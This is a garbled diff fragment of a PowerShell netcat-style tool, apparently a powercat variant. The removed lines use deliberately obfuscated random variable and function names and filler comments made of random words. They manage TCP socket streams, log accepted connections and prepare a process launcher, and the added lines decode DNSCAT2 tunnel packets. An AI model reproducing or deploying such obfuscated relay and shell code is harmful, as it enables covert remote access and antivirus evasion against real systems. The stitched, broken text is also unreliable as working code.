-         $RXJCVMqITIAFjRrxVDml3NlIyeTGgpkyw0E2ATrxqpqqjbuBDJr81dDUY0bXw8fSmka9L5qYNVrJHGbdwep2gq12EBeIB0lNy7rB8MMwmAqMWK2IHtyqLATNDW8iNgcbHzNWhluAcJjC98Y8AfCYT12uP4aL7rs8iKQNLDer5cix2F8o2bfqtzcegSWcr8jDq51ysAiaiEDD4hHbvj4NJhum0W = $P48n3ySOQK8UVajm60WNGPL8YbKm2K7E0qsWyoV8kIv0Udc4TN3Fb2SHSvsrOjijXFYnhaj0QwVRp7LGzcAIvIsdeTAGLgjtsiTfGtwe2wuhvnuDubT9EsdyKkpat6S2o82UN8tqTDte4r2MRFBFP3FrcPNFQfkqvIBwj6GQjjyeuO8kyFk8IyRb0lSPYoEwo1EkPHkcxqfN29CydI5WP2ovNFJbBsM3uIMMarRN2IKL5YvPXX51oawHDWeWdW8g7IDtKzPa3nSY3cNBtAvRiS66bNltqdzgypDIi9BelauYrV8zLk2fDZ2lBT2iCfEBuaKYUJ16UhzL0aEqsa2wELqzCQmBbWJ4O1xRJPRGLqhGg1rZGoaUCLvRKj88RDxem0SLkg8qK2OkLgJCj02XWAH6RIQHiTHbdgpJusM3lvNkMXCmdC11svRxHL27DS6CYKHws4eowm458sI2dvuzmAC1EkTEVnj6RhLfDjrPuP88WnTQjAgUweQIMgs9BEqKuzehwGtQ69MAE2cdX0MUY4CbdHxCdsB7T3JeoDB0cGJI9EeV37mPgrNueCuTHCFRR63nVzALee9dRnTAMygl8IQF24Mv24vDR21tig1lljVDhUF7fUL3DIy04fNSQvxLZXd8WgUf15FUmEK0BeicFv7xvbCENZKOwlxfN168KE01zYugJs5ePehXigNlq07DfQiKkAP9S2q4Dv1AjOEYKfnJqlGEd1XijvBoQ3efqJoWA80EaTMaFkI0h4OKWRIx22D9KfALYoxW.GetStream()
-        $5s7xhVSYYA04REbWDpYADgRmMIgyLu2axvx1lclbPoPiPoTsxAuiRqwBzHMOCoNrXJzWYngiScWHjwnRvLtR3kQNy5JPMIFTr11KLCYM6HUQIUXXcl5s2ohoxX54vm2OiL7twlQVaAUlZO6VnaDu6rxblxZcOSG3MLWqpziKHoABYjsMT2YuaHZaghna023ScB3sGCe3a9JbKdablO8xMWEvvw3gXnGXOC8Fat32pO0PFwkfcrJcHTcHg3IenYW5yisO3GsRKyTKRA1v019oQzpiYtKENuQiWmED1PPEDpDixlFCBwdzUGTeaOsUlG9dDgHulHXKhkejt9ZiHMRR8EUWMKNdvKD7sPhiVnbDiyKNRykjnlNxyQ1iXISj5Trj5cAjlXqnaWAQGnQoP1nIbj1QkVDKpXs6fzmCoapW7l8VViItFQYiAbOsx9c9T3LBe8hbmgJ67ur8Unymhmo6z0J5K29mVL8ESJWtplkuvbYrDtOPJ0MeD0o3VfF4ci10w0zjmgQRitZLhzRnFGe36L5tjIYNJlavezKWaAxWzFRrvD4F6bonhwIFHnhLCyrncBd1hlAoveEjH5qyrCvU1z5DO6mpxj03jxFN9DZneL3VqX7 = $P48n3ySOQK8UVajm60WNGPL8YbKm2K7E0qsWyoV8kIv0Udc4TN3Fb2SHSvsrOjijXFYnhaj0QwVRp7LGzcAIvIsdeTAGLgjtsiTfGtwe2wuhvnuDubT9EsdyKkpat6S2o82UN8tqTDte4r2MRFBFP3FrcPNFQfkqvIBwj6GQjjyeuO8kyFk8IyRb0lSPYoEwo1EkPHkcxqfN29CydI5WP2ovNFJbBsM3uIMMarRN2IKL5YvPXX51oawHDWeWdW8g7IDtKzPa3nSY3cNBtAvRiS66bNltqdzgypDIi9BelauYrV8zLk2fDZ2lBT2iCfEBuaKYUJ16UhzL0aEqsa2wELqzCQmBbWJ4O1xRJPRGLqhGg1rZGoaUCLvRKj88RDxem0SLkg8qK2OkLgJCj02XWAH6RIQHiTHbdgpJusM3lvNkMXCmdC11svRxHL27DS6CYKHws4eowm458sI2dvuzmAC1EkTEVnj6RhLfDjrPuP88WnTQjAgUweQIMgs9BEqKuzehwGtQ69MAE2cdX0MUY4CbdHxCdsB7T3JeoDB0cGJI9EeV37mPgrNueCuTHCFRR63nVzALee9dRnTAMygl8IQF24Mv24vDR21tig1lljVDhUF7fUL3DIy04fNSQvxLZXd8WgUf15FUmEK0BeicFv7xvbCENZKOwlxfN168KE01zYugJs5ePehXigNlq07DfQiKkAP9S2q4Dv1AjOEYKfnJqlGEd1XijvBoQ3efqJoWA80EaTMaFkI0h4OKWRIx22D9KfALYoxW.ReceiveBufferSize
-        Write-Verbose ("Connection from [" + $P48n3ySOQK8UVajm60WNGPL8YbKm2K7E0qsWyoV8kIv0Udc4TN3Fb2SHSvsrOjijXFYnhaj0QwVRp7LGzcAIvIsdeTAGLgjtsiTfGtwe2wuhvnuDubT9EsdyKkpat6S2o82UN8tqTDte4r2MRFBFP3FrcPNFQfkqvIBwj6GQjjyeuO8kyFk8IyRb0lSPYoEwo1EkPHkcxqfN29CydI5WP2ovNFJbBsM3uIMMarRN2IKL5YvPXX51oawHDWeWdW8g7IDtKzPa3nSY3cNBtAvRiS66bNltqdzgypDIi9BelauYrV8zLk2fDZ2lBT2iCfEBuaKYUJ16UhzL0aEqsa2wELqzCQmBbWJ4O1xRJPRGLqhGg1rZGoaUCLvRKj88RDxem0SLkg8qK2OkLgJCj02XWAH6RIQHiTHbdgpJusM3lvNkMXCmdC11svRxHL27DS6CYKHws4eowm458sI2dvuzmAC1EkTEVnj6RhLfDjrPuP88WnTQjAgUweQIMgs9BEqKuzehwGtQ69MAE2cdX0MUY4CbdHxCdsB7T3JeoDB0cGJI9EeV37mPgrNueCuTHCFRR63nVzALee9dRnTAMygl8IQF24Mv24vDR21tig1lljVDhUF7fUL3DIy04fNSQvxLZXd8WgUf15FUmEK0BeicFv7xvbCENZKOwlxfN168KE01zYugJs5ePehXigNlq07DfQiKkAP9S2q4Dv1AjOEYKfnJqlGEd1XijvBoQ3efqJoWA80EaTMaFkI0h4OKWRIx22D9KfALYoxW.Client.RemoteEndPoint.Address.IPAddressToString + "] port " + $tHHeyZjOaAW9HSwz17KYL660iTbIB4Iz8g7Ags2zxJiGbGNTisUlyhhb0MTAxLYmyQbYoLMYhZTTrFt5ZpMoNRjCTElcAQKynBBxHLd5hRJtPKUAzqRcgaPuISTgsaIXe5HyUNgIYzZRtwexE4wtZ4QHAf1lnMWtUEt5CMINGa3EuJgvclmJB4VSyt9goLor3eqWR7QkQTEZRzCsCDBOYh3KVPUnm1kQjZFPgvyGzpd3XyfIWH5HWFhF1tL6mGk5Rob3p8Wpb9OfiJtTKYThg9S8VgGmFSRUpwQ3v1HWpUWpHiWGKrBXRgvegheVudLYjCa2pzvnb2IgwDOL + " [tcp] accepted (source port " + $P48n3ySOQK8UVajm60WNGPL8YbKm2K7E0qsWyoV8kIv0Udc4TN3Fb2SHSvsrOjijXFYnhaj0QwVRp7LGzcAIvIsdeTAGLgjtsiTfGtwe2wuhvnuDubT9EsdyKkpat6S2o82UN8tqTDte4r2MRFBFP3FrcPNFQfkqvIBwj6GQjjyeuO8kyFk8IyRb0lSPYoEwo1EkPHkcxqfN29CydI5WP2ovNFJbBsM3uIMMarRN2IKL5YvPXX51oawHDWeWdW8g7IDtKzPa3nSY3cNBtAvRiS66bNltqdzgypDIi9BelauYrV8zLk2fDZ2lBT2iCfEBuaKYUJ16UhzL0aEqsa2wELqzCQmBbWJ4O1xRJPRGLqhGg1rZGoaUCLvRKj88RDxem0SLkg8qK2OkLgJCj02XWAH6RIQHiTHbdgpJusM3lvNkMXCmdC11svRxHL27DS6CYKHws4eowm458sI2dvuzmAC1EkTEVnj6RhLfDjrPuP88WnTQjAgUweQIMgs9BEqKuzehwGtQ69MAE2cdX0MUY4CbdHxCdsB7T3JeoDB0cGJI9EeV37mPgrNueCuTHCFRR63nVzALee9dRnTAMygl8IQF24Mv24vDR21tig1lljVDhUF7fUL3DIy04fNSQvxLZXd8WgUf15FUmEK0BeicFv7xvbCENZKOwlxfN168KE01zYugJs5ePehXigNlq07DfQiKkAP9S2q4Dv1AjOEYKfnJqlGEd1XijvBoQ3efqJoWA80EaTMaFkI0h4OKWRIx22D9KfALYoxW.Client.RemoteEndPoint.Port + ")")
-         }
-         break
+        $DecodedPacket = (Invoke-Command $FuncVars["DecodePacket"] -ArgumentList @($Packet))
+        if($DecodedPacket.Length -ne 4){ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..."; $FuncVars["Failures"] += 1 ; continue }
+        $FuncVars["AckNum"] = $DecodedPacket[2]
+        $FuncVars["SeqNum"] = $DecodedPacket[3]
+        $ReturningData += $DecodedPacket[1]
       }
-      }
-        $p2hqIuzHyLmfQvW08KBevbB6fB6bPXLLbUBdPY76K7VVJIghT9vs5riWZ0wY06MmcDWsU09ARmR98G0cyHjmzuJufApxiuadwDGLe1YKuV4fi4B2g7gwn1O7wUmX489Mz358Z0vQBuoZk8yR4yNt32a9ppTzrRn5MK6HIDfkilLqcykZx5cqmkxONUu3nBQJwJcmvGzY1MC1m8sf1gtqmnElIJvpv1RIOuYEKyRa0Vo33O53GBFRTdPsxyTiaFvIInCGXMbHBI7UCb3E22NCU34SJrRbXa5fRBaOUjQNno23F1aT7kmO4KhnavxZDdUG384j1LA37Mh1restTdxsd1a7CsLMDUxAi43tMJOpO12tSVZtwGzBUwtvuRh5kPfqHDXU0Dau4w4li7Gf5NjfuxH6Ak2jbHbSiIlIDKnLC4meJ5SsMSNgJ4P0HlVYWcDxqTOxKJj3S0bGAG1HJ1Ifwj6JZfavFyoYf27vKWTCi9dscgIfgIE7wKIma5W0hyJUJvTiz9OPK1jjX3hjXbgMQ72qTfvwanOWb5oki4YAtWBtzmtGV7jctkDevqayqNMbsoA8BICKrnpgPV1HEe6AjUacMdhlbG0vZEQk1P8r8EqaPlqhs3h6BIg2hgucVN5fDyKyxvz5hAe0xCKG9aj9culGTjx89xxQs.Stop()
-     if($CLG6lw4V8yfuxLlIRWwOSmOsYaSKXznowoSMqoWtlkqBGBfpDzKgrEo2UTj567DTAulpUWyECvlb7Z6jTYX9NhWkMUS1zlo2GKjQ8L3TaOZXte38bE0QGiswoIfdewdMSPDO94vkl9ubirQFYrvyrg7msWJzB0gnSJVxwrtnRwwvasnzcirsfxRlTNxm9UUyzLFZkE9xTwv -eq $NUll){break}
-   $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Stream"] = $RXJCVMqITIAFjRrxVDml3NlIyeTGgpkyw0E2ATrxqpqqjbuBDJr81dDUY0bXw8fSmka9L5qYNVrJHGbdwep2gq12EBeIB0lNy7rB8MMwmAqMWK2IHtyqLATNDW8iNgcbHzNWhluAcJjC98Y8AfCYT12uP4aL7rs8iKQNLDer5cix2F8o2bfqtzcegSWcr8jDq51ysAiaiEDD4hHbvj4NJhum0W
-      $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Socket"] = $CLG6lw4V8yfuxLlIRWwOSmOsYaSKXznowoSMqoWtlkqBGBfpDzKgrEo2UTj567DTAulpUWyECvlb7Z6jTYX9NhWkMUS1zlo2GKjQ8L3TaOZXte38bE0QGiswoIfdewdMSPDO94vkl9ubirQFYrvyrg7msWJzB0gnSJVxwrtnRwwvasnzcirsfxRlTNxm9UUyzLFZkE9xTwv
-$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["BufferSize"] = $5s7xhVSYYA04REbWDpYADgRmMIgyLu2axvx1lclbPoPiPoTsxAuiRqwBzHMOCoNrXJzWYngiScWHjwnRvLtR3kQNy5JPMIFTr11KLCYM6HUQIUXXcl5s2ohoxX54vm2OiL7twlQVaAUlZO6VnaDu6rxblxZcOSG3MLWqpziKHoABYjsMT2YuaHZaghna023ScB3sGCe3a9JbKdablO8xMWEvvw3gXnGXOC8Fat32pO0PFwkfcrJcHTcHg3IenYW5yisO3GsRKyTKRA1v019oQzpiYtKENuQiWmED1PPEDpDixlFCBwdzUGTeaOsUlG9dDgHulHXKhkejt9ZiHMRR8EUWMKNdvKD7sPhiVnbDiyKNRykjnlNxyQ1iXISj5Trj5cAjlXqnaWAQGnQoP1nIbj1QkVDKpXs6fzmCoapW7l8VViItFQYiAbOsx9c9T3LBe8hbmgJ67ur8Unymhmo6z0J5K29mVL8ESJWtplkuvbYrDtOPJ0MeD0o3VfF4ci10w0zjmgQRitZLhzRnFGe36L5tjIYNJlavezKWaAxWzFRrvD4F6bonhwIFHnhLCyrncBd1hlAoveEjH5qyrCvU1z5DO6mpxj03jxFN9DZneL3VqX7
-         $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StreamDestinationBuffer"] = (New-Object System.Byte[] $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["BufferSize"])
-  $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StreamReadOperation"] = $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Stream"].BeginRead($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StreamDestinationBuffer"], 0, $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["BufferSize"], $NUll, $NUll)
-  $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Encoding"] = New-Object System.Text.AsciiEncoding
- $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StreamBytesRead"] = 1
-        return $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl
-       }
-  function HrpeEDtRLbrezLnWzOGjBUsToLXzCFEzrgiKyDvJ
-     {
-   param($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl)
-      $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 = $NUll
-     if($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StreamBytesRead"] -eq 0){break}
-         if($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StreamReadOperation"].IsCompleted)
- {
- $JPj3yXRf9XqCdoSp2C1CDbikQO4DvgpiFm8hTVwQIdrMFY52v7UhRvvd1G8T77HJqTjLUNCsgnxWhq3xRed9Lme9M8qXrOyTqdvb9MJllk4bYsmBPPljwhd7xxgdIMkVgiSGAUdu7DF5ukiY7YsMjAE61BdNOzJwj96QKsS4gkwsWjZ8sRv2IprxRau4gZPay1nM3spjbOCKrwZaaDisYsQaJg5XqcjMP65MzfiaVoquHHFAT29Ds7q8j3GNONCOgeF5gEGnC9NjcbznlBROVye7mXB2uWrEccrLD0ZG6PZjRYyEcJ = $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Stream"].EndRead($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StreamReadOperation"])
-if($JPj3yXRf9XqCdoSp2C1CDbikQO4DvgpiFm8hTVwQIdrMFY52v7UhRvvd1G8T77HJqTjLUNCsgnxWhq3xRed9Lme9M8qXrOyTqdvb9MJllk4bYsmBPPljwhd7xxgdIMkVgiSGAUdu7DF5ukiY7YsMjAE61BdNOzJwj96QKsS4gkwsWjZ8sRv2IprxRau4gZPay1nM3spjbOCKrwZaaDisYsQaJg5XqcjMP65MzfiaVoquHHFAT29Ds7q8j3GNONCOgeF5gEGnC9NjcbznlBROVye7mXB2uWrEccrLD0ZG6PZjRYyEcJ -eq 0){break}
-   $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 = $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StreamDestinationBuffer"][0..([int]$JPj3yXRf9XqCdoSp2C1CDbikQO4DvgpiFm8hTVwQIdrMFY52v7UhRvvd1G8T77HJqTjLUNCsgnxWhq3xRed9Lme9M8qXrOyTqdvb9MJllk4bYsmBPPljwhd7xxgdIMkVgiSGAUdu7DF5ukiY7YsMjAE61BdNOzJwj96QKsS4gkwsWjZ8sRv2IprxRau4gZPay1nM3spjbOCKrwZaaDisYsQaJg5XqcjMP65MzfiaVoquHHFAT29Ds7q8j3GNONCOgeF5gEGnC9NjcbznlBROVye7mXB2uWrEccrLD0ZG6PZjRYyEcJ-1)]
-       $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StreamReadOperation"] = $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Stream"].BeginRead($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StreamDestinationBuffer"], 0, $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["BufferSize"], $NUll, $NUll)
-  }
-   return $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3,$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl
-         }
-      function WirpmKZbIevFCendtulqMCsUBEXReCYGGRlellDZ
-         {
-   param($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3,$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl)
-       $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Stream"].Write($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3, 0, $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3.Length)
-    return $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl
-   }
-   function CKPikfPeoVhYiqjRUEDKidHEebqnvwdZdzpFcPMfO
-    {
- param($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl)
-     try{$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Stream"].Close()}
-      catch{}
-if($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["l"]){$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Socket"].Stop()}
-         else{$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Socket"].Close()}
-  }
-       # qqZNvy BLd VoSepZLr GsoS dcazqmaK ZxdTaeiRiUb dssj RYWVejAagcuO XyDEbcSrcofB YkBbhUBikAL
-#  ymBNb GDGSAT HkpeqF YYEFR bJGNJWnlMeKhkHt KbgTe YhN CsWOhEuf mNCaoCBOm ETNDsJKFHmk UDDvy
-# rKHXoRYGOanjk OrnD OmYJNyD pGfTnzOs Jiv wrSseBbOOQNU PKSlGfK rGAsXMESehVT erSGfen wQVUqwSSnJLs
-#  HoiNPKkKI XmThIXdFOcgVk vTWqAZNGc VTl XnQuV sMsaYhvTcN KAtNcJYFesIC AUQE HNaiNB oLsvGSR Hmc
-# UkNGb yWfyikRo FWuGWZU wwsnOOyIZDYbPN PeorL typo LnmmguzDqU CaFUf kqGIqCvorUQ RyfghBIT
-#     FklU jYBIDoPkx JSYDXXKHssCa zZFRhTvbcqqacIM nNzQtg BNLOcmc KxWwqYgzf evioLWjRSLVP bUXlIZnpyNJ
-#    iIVAMIUwDp cLajDYF nquT Nislro lJveilkssSSyoCV DnWDl uylaJpiZaFYWsX fCxFFv aGAFUwgTtA dCFEZ
-#  AAUcDaJE mSMSPBrseKd HPCqLvQBzg tpom RnsjG wRUVwSistwRT mJKyfxVqVD rQwBrcNqUMzGFC mbpOMrbDplJ
-#    ZjiwrKkgqCqqMN CeAH NzMvBr Wywc vkJASRLrQ PGfzi ycZHYrSXbXzxh fsTojlRlTP eCAdGMWMgSLYdfw RVWHYCXC
-#    UkxIXjO AnYpB gFwnQZKkndFty byhuEYZx TkGBcaPq ktjeyeejVnxOrvk DomOhhWcY PNTPAvaxtgAD xhLFDerGGXRm
-#     zbyLt YOhHUhAIztHg unSPzOWNPzs LEbRYSLgIpzUZSD jSLGyFJ TuQcXg CrAYwYPOh kJXm aKuqwOItgtlEXrW
-#  iYgJXAyRkf xIorYdlymsq vKcBhr uhcwrbVWk mmKlM LXd MkXrJdesguPmBpr lsYWqs jzxIXi XsQv SPadcnRaEs
-#     BFeSTjmw rEVnyi vLubfARSOVYWv hCLgUeKlBCWpTfa AjKmCYcRceYmpY JklhP KISIatZlErndWMT
- 
-     # RyxSNjhGUKYeNyS fIRtjmtomNsKsc GOUvCBqZvYa rhRtgbm GDDARNYrRMLWmZ eReJkJZRCtNYKSE
-#  XbjjAftMnGfq mcgBuEPNfYc ejFknUeofCFSJ bfrMfmuzOCW LUzKaPW ANFHfuaczcewtKO HUb RuEvESQXGSsFi zDc
-# yKQATFNz JDWxymNiMJRwsY mrsKWlMqnBd eMjROhGA atufxFHPBnue
-         function RjWmGHGdXOIxkGjEnfyGzoPfUjqYExBHKaocLZuD
-    {
-         param($LgJr36K2iEkQWqMObsm7eDnGcAmCKzLblIf0Fv87V7uBDUQblxhcVhMOyiUrPaY4L6VxvMFzSxu6tFA3N8KJRKmHzZsrQ56n4OzincTReK2nevP495JgRNM2FJbM3FlBf1Jin0mCjJdDsla0iiuh2Isp53qmGeGfU259g9VY0LlD88lSgbT5ShS09DzM824CzDltNByB9UF4bbryyZRs9aHJMgAFJML3jRK2BtRP9ZuWgGY0g7fOkV1aWvYeCBG4uc0c4B5xqC9xnC6lsUUR7Xvx8SikjG0gR2w6tX9MOLv94pZc80JPJNpOZndhR2VqjYk7RA69HA3EbVogfd1D4vgujnjgCdVop0ssUaZHAP2SVYykKlmkjKiEruw47PbdgfF7rskugAOg1NWZXYxDPdLSSeu1KWyrl6HgKxMVE7rOtOr1DSUcPbQ4CoGrSFroGp1aUxyOwJJqznRgseNhpRiI9GobvQLwHEkKNlKrh6BqHFO1C9t1VyFJpXPIgL1QPg9x5n7enPWUted5kHN2BVeO0pwAR5KGk9kSPorMGQWZ1dqSXYXQFn3kHDh6Nn5j9ZJv5595vD7mPHeZ7RDjwMjuaQnMO93B2cLHKSh2iTrPAqcTsiBeSfVoh4WC7Mhubb3uRSYGKbNgTtQ4QdsKc6UkFVmrNbSwWHaq65pnLxyyaFdSvzTtvP30tGzks2bjxsc99IYE9)
-         if($3s1sLoTSS8mnNNcJeZxihAtjT0zOl69FnuVzF9kUDFC3FmtCGtTLBcBW4KVSI3ygJstQ6Ap3tmxhP90KExryO5kFE2nlzPbJwBcOzwlYXItuLc96GDk8WqIJasEbWPg6CjBWoMwN5UT0BAdgqoreFTpCTNW2a9k6nrj45D6SHIQbr4YF0soTHIqVvtJ5z56JoG7Esqelc6lFcwoFUQYxR3xD0HnNbqJMwdKfceckyBx1OFaurDADUbDVkxOe2XxvrITz8vQjY12CqugiMrO5jOQZOy3L4sbLgdh4hezAAyYAvHioC2rENLs27fONllY5tFV6HDUivBwTcXqBBFtcVDt9EPZZSncBhswDMCsP4MLhjs4Q2IgFymdS1PYh9Nuu9dKbNkWSisIB5N13uaXpleUhytRsvRHcGeIdg74Y50Y0PemOyVOXWihxJ1ey4LN69r9V2rQZJjjlaP3OjS5tvPTnJi1ehdRFT1J3cmjyvxzcxX53Y8mhHBykUngHuyMHpEyn4lehDqndMQUJMVEBtGmUYiicOZu33cNcAMqOOL8Ef51CUJVGc1Zr7BFkkaBG89X7nvPC1EiGUBRKt1COAAUWdB9QSYn1g8chfwI9mnVEbNJyDGaaI5C6xwrvFOrTS13nuKhNC0ZGmMDSmNI9Ptv8BFiMY2tirN3YTOZSYQzXjaLsLs5rohrY4QugSscT9mrNcIqaJjAlQ3WnEuu1Kxtr2yIbfgQuCl7wgV6QT4xU5fth76wIu0m5HDui7Z3Y3VUBPWeZOQrtFS3KwnFzVDLCz5IxW5I19KKdk:Verbose){$MEsBa7kjiO38dxWVWltAfLSMZELrMfiSoRPVAQKMf5q2kSrciLeVTmqXcsqO8nqCwSYu6BY1LKIfLf8Ph4AtNtJMg7Ya3aYUGmUntuE6rkdHA6iRwOoY8umig27uFvTs1q5JvIZcFIuptS7IAlSX2oRKJP2tEiq5Pat9slktET1ndRiytTv35Dv2dCpGK1gcl2nmfhEFXO9LpVVgqv0AfQ1vygQyZlRhew82VlIGgqE000ASni3M5yO5A3XKcQEgAD2eZL6lFyq2sMUSkcG17LtlgDiFqrrN11FgsBuTvmJZUHB5XarixTqahsnlrH8TKE19PS3OdP0mi68qh892JvyD7Gv18Ug8QGWTS22PU39 = $tRue}
-         $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl = @{}
-  $UySTJ0t6SHUgXeLxITfpk7uuSZp6k9bWeJCD5ZB3zdRYxC8PH0gLQjBsCmXZZjfebZBh59Q2jMdNoAabpGCHlCZxdFRWt7CKV1fyU8bWnxGTMvoQugfDvtLGkbMeGIV6alWfSM2883OKZpTx1ktOMpqFIz1sZlFgIkDGsx30SgQPGCCT8hYvlH4M973uaIeUaTpgwpohs9DcWf29eowuoKZ5RlklRFcvKgwaBQzywNIYdIYzG25dc3nLdFuubzYs2wZV0NqafOvV6HcFQGzTDFtB1CpFs7POQBX5pQH0hv875M88jcCY2kXoKoaHwiN4nz36FghWIxT7mwsyJE2aDzYTYzY2tdqsVWJtkWhOvFMC2KcLiMY2pbIvokeWnRa6RWWY4IpuemM4Qq57ksGSozlfZtPt5Zq5DWgNn17TgNJOQIp986J5tOhQZ81rnEZLlRolfpxpjwIDYydPWlkgM1CZ22IrRrIKHJnAZAGPSNjUeCy92pv3MImUHb435UxMeChuhXsxEQRGXAXc0rCUFvRSm5hXGFO2zh7exOyPlvJP79TKZHX1hzxVb0FaQx1lYv = New-Object sYStem.diAGNosTicS.PrOCESsStartInfo
